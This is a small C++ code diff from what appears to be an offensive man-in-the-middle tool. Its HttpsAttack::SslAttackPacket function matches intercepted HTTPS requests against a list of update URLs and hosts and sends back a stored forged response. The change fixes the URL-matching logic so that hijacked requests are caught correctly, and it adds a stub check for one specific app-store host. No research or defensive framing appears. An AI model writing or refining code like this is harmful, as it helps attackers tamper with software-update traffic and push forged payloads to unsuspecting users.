@@ -55,8 +55,11 @@ int HttpsAttack::SslAttackPacket(char* buf, int size, const char* url, const cha
 	int ret = 0;
 
 	int resultlen = 0;
+	if (strstr(host, "app4.i4.cn")) {
+		//printf("hello\r\n");
+	}
 	for (int i = 0; i < gUpdateData.size(); i++) {
-		if (strstr(gUpdateData[i].url.c_str(), url) && strstr(gUpdateData[i].host.c_str(), host)) {
+		if (strstr(url,gUpdateData[i].url.c_str()) && strstr(gUpdateData[i].host.c_str(), host)) {
 			string resp = gUpdateData[i].response;
 			ret = sendAttackPacket(resp.c_str(), resp.length(), spp);
 			return ret;
